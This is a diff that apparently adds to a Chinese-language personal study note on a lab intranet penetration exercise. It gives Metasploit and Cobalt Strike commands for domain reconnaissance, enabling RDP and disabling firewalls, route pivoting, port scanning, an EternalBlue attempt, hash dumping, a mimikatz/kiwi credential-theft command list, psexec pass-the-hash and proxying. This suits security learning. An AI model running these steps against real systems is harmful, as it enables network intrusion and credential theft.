@@ -322,9 +322,101 @@ proxychains -h //这里就可以看到conf配置文件的位置
 
 `在cs中执行命令需要加上 shell，比如 shell whoami`
 
+### (3)域内信息收集
 
+```java
+net view                 # 查看局域网内其他主机名
+net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+net user                 # 查看本机用户列表
+net user /domain         # 查看域用户
+net localgroup administrators # 查看本地管理员组（通常会有域用户）
+net view /domain         # 查看有几个域
+net user 用户名 /domain   # 获取指定域用户的信息
+net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+net group 组名 /domain    # 查看域中某工作组
+net group "domain admins" /domain  # 查看域管理员的名字
+net group "domain computers" /domain  # 查看域中的其他主机名
+net group "doamin controllers" /domain  # 查看域控制器主机名（可能有多台）
+```
 
-## 把cs中的回话派生到msf中
+1、先判断是否存在域，使用`ipconfig /all`查看DNS服务器，发现主DNS后缀不为空，存在`域god.org`
+
+![image-20240107135109265](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135109265.png)
+
+也可以执行命令`net config workstation`来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息
+
+![image-20240107135512647](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135512647.png)
+
+2、上面发现 DNS 服务器名为 god.org，当前登录域为 GOD 再执行`net view /domain`查看有几个域(可能有多个)
+
+3、查看域的组账户信息(工作组)
+
+![image-20240107135624777](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135624777.png)
+
+4、既然只有一个域，那就利用 net group "domain controllers" /domain 命令查看域控制器主机名，直接确认域控主机的名称为 OWA
+
+![image-20240107135749468](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135749468.png)
+
+5、确认域控主机的名称为 OWA 再执行 `net view` 查看局域网内其他主机信息（主机名称、IP地址）
+
+![image-20240107135805023](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135805023.png)
+
+cs中会更加具体一点（主机ip也有）
+
+![image-20240107135845251](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107135845251.png)
+
+扫描出来 除了域控OWA 之外，还有一台主机ROOT-TVI862UBEH
+
+至此内网域信息收集完毕，已知信息：域控主机：192.168.52.138，同时还存在一台域成员主机：192.168.52.141，接下来的目标就是横向渗透拿下域控
+
+### (4)rdp远程登录win7
+
+Win7跳板机 默认是不开启3389的，同时还有防火墙
+
+```java
+#注册表开启3389端口
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+#添加防火墙规则
+netsh advfirewall firewall add rule name="Open 3389" dir=in action=allow protocol=TCP localport=3389
+
+#关闭防火墙
+netsh firewall set opmode disable   			#winsows server 2003 之前
+netsh advfirewall set allprofiles state off 	#winsows server 2003 之后
+```
+
+或者使用msf中的命令
+
+```java
+run getgui -e
+run post/windows/manage/enable_rdp  //两个命令都可以开启远程桌面
+```
+
+在开启远程桌面之前，我们还需要使用`idletime`命令检查远程用户的空闲时长：idletime
+
+(提示：远程主机和主机，同一时间只会登录一个，所以需要看空闲时长)
+
+##### 这里用的端口转发
+
+portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下
+
+```java
+portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
+```
+
+然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了
+
+```undefined
+rdesktop 127.0.0.1:3389
+```
+
+![image-20240107144314884](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107144314884.png)
+
+其他用户：密码从cs插件miti就可以获得
+
+## <4>内网渗透
+
+### (1)把cs中的回话派生到msf中
 
 前提是 cs已经获得了靶机的会话
 
@@ -346,7 +438,7 @@ exploit
 
 ![image-20240104212120119](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212120119.png)
 
-##### msf的简单利用
+### (2)msf的简单利用
 
 判断靶机 是否属于虚拟机（检查是否进入了蜜罐）
 
@@ -359,6 +451,156 @@ run post/windows/gather/checkvm
 在如调用`post/windows/gather/enum_applications`模块枚举出安装在靶机上的应用程序：
 
 ![image-20240104212635472](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212635472.png)
+
+### (3)添加路由(这里添加路由，只能msf能访问到，msf外不可)
+
+```java
+# 可以用模块自动添加路由
+run post/multi/manage/autoroute
+#添加一条路由
+run autoroute -s 192.168.52.0/24
+#查看路由添加情况
+run autoroute -p
+```
+
+![image-20240107145903676](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107145903676.png)
+
+### (4)内网端口扫描
+
+先执行background 命令将当前执行的 Meterpreter 会话切换到后台（后续也可执行sessions -i 重新返回会话），然后使用 MSF 自带 auxiliary/scanner/portscan/tcp 模块扫描内网域成员主机 192.168.52.141 开放的端口：
+
+```java
+use auxiliary/scanner/portscan/tcp
+set rhosts 192.168.52.141
+set ports 80,135-139,445,3306,3389
+run
+```
+
+![image-20240107150359572](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107150359572.png)
+
+192.168.52.141 win2003域成员机开启了 135、139、445端口
+
+192.168.52.138  域控开启了80、135、139、445端口
+
+### (5)MSF进行ms17-010攻击（未成功）
+
+对于开启了 445 端口的 Windows 服务器肯定是要进行一波永恒之蓝扫描尝试的，借助 MSF 自带的漏洞扫描模块进行扫描：
+
+```java
+search ms17_010
+use auxiliary/scanner/smb/smb_ms17_010
+set rhosts 192.168.52.141
+run
+```
+
+#### 漏洞利用
+
+```java
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/bind_tcp #内网环境，需要正向shell连接
+set rhosts 192.168.52.138
+run
+```
+
+看很多师傅说一般成功率不高
+
+### (6)哈希传递攻击(PTH)拿下域控
+
+![image-20240107152018482](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107152018482.png)
+
+可以利用抓取到的密码 psexec 利用域管理员账户 Hash login一下 监听器选 windows_smb/bind_pipe
+
+![image-20240107152905930](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107152905930.png)
+
+(采用的SMB，这里本地cs东西太多了，未成功)
+
+拿到正向会话(前面三层内网靶机有讲正向反向)之后，我们可以右键 目标->文件管理
+
+![image-20240107152946686](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107152946686.png)
+
+可以看到域控的文件 我们可以进行上传文件操作，拿下域控
+
+### (7)MSF哈希传递攻击
+
+`run windows/gather/smart_hashdump` 来进行hashdump
+
+需要SYSTEM权限，我们直接getsystem 发现可以正常提权
+提到SYSTEM权限之后再执行 `run windows/gather/smart_hashdump`
+
+![image-20240107153454857](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107153454857.png)
+
+得到管理员的密码的hash
+
+```java
+[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[+]     liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+但是这个只是用户密码的一个hash值，我们在msf里加载mimikatz模块
+ps：ms6中 mimikatz模块已经合并为kiwi模块
+
+```java
+
+load kiwi
+
+creds_all  #列举所有凭据
+creds_kerberos  #列举所有kerberos凭据
+creds_msv  #列举所有msv凭据
+creds_ssp  #列举所有ssp凭据
+creds_tspkg  #列举所有tspkg凭据
+creds_wdigest  #列举所有wdigest凭据
+dcsync  #通过DCSync检索用户帐户信息
+dcsync_ntlm  #通过DCSync检索用户帐户NTLM散列、SID和RID
+golden_ticket_create  #创建黄金票据
+kerberos_ticket_list  #列举kerberos票据
+kerberos_ticket_purge  #清除kerberos票据
+kerberos_ticket_use  #使用kerberos票据
+kiwi_cmd  #执行mimikatz的命令，后面接mimikatz.exe的命令
+lsa_dump_sam  #dump出lsa的SAM
+lsa_dump_secrets  #dump出lsa的密文
+password_change  #修改密码
+wifi_list  #列出当前用户的wifi配置文件
+wifi_list_shared  #列出共享wifi配置文件/编码
+```
+
+首先通过 cs获得的
+
+![image-20240107154948501](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107154948501.png)
+
+```java
+set smbpass 00000000000000000000000000000000:2ccad3c60ca0adabf81dcf617017ed82
+```
+
+2、获得 NTLM Hash：b0093b0887bf1b515a90cf123bce7fba，在 Metasploit 中，经常使用于哈希传递攻击的模块有：
+
+```java
+auxiliary/admin/smb/psexec_command   //在目标机器上执行系统命令
+exploit/windows/smb/psexec           //用psexec执行系统命令
+exploit/windows/smb/psexec_psh       //使用powershell作为payload
+```
+
+3、以exploit/windows/smb/psexec模块哈希传递攻击 Windows Server 2008 为例：
+
+```java
+use exploit/windows/smb/psexec
+set rhosts 192.168.52.138
+set smbuser administrator
+set smbpass 00000000000000000000000000000000:b0093b0887bf1b515a90cf123bce7fba
+set smbdomain god
+run
+```
+
+![image-20240107160239321](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107160239321.png)
+
+这里很蒙？先学习去了润了（2024.1.7）
+
+
+
+
+
+
+
+
 
 
 
@@ -378,7 +620,7 @@ linux/x86/shell_reverse_tcp      //64位
 ```
 
 ```java
- kali 命令窗口通过：msfconsole
+kali 命令窗口通过：msfconsole
     
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
@@ -390,6 +632,65 @@ exploit  //这里其实就是监听端口
 然后把生成的exe上传到靶机，直接运行
 
 ![image-20240103192146938](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103192146938.png)
+
+#### msf解决乱码
+
+```java
+chcp 65001即可
+```
+
+![image-20240107122137271](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107122137271.png)
+
+## msf建立代理的方式
+
+前提是：msf已经添加了内网网段的路由
+
+```java
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1  #或者默认0.0.0.0
+run
+```
+
+![image-20240107161436933](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107161436933.png)
+
+2. 编辑proxychains
+
+vim /etc/proxychains4.conf
+proxychains4 命令
+
+
+访问内网主机的web服务
+
+ps：proxychains只对tcp流量有效，所以udp和icmp都是不能代理转发的。
+
+使用namp进行扫描，nmap通过socks代理进行扫描，必须加上 -sT、-Pn两个参数
+
+msf6 auxiliary(server/socks_proxy) > proxychains4 nmap 192.168.10.2 -sT -Pn -p80,445,135
+##### -sT  全开扫描，完成三次握手
+##### -Pn  不使用ping扫描
+
+
+ 3. 那假如我们要在我们自己的电脑上访问内网了，我们可以将代理服务器的ip设置为vps公网的ip
+
+![image-20240107161833119](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107161833119.png)
+
+ 然后浏览器设置socks5代理
+
+还是老老实实的nps叭
+
+
+
+参考链接：[MSF使用详解-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/235631#h3-30)
+
+
+
+
+
+
+
+
+
+
 
 
 
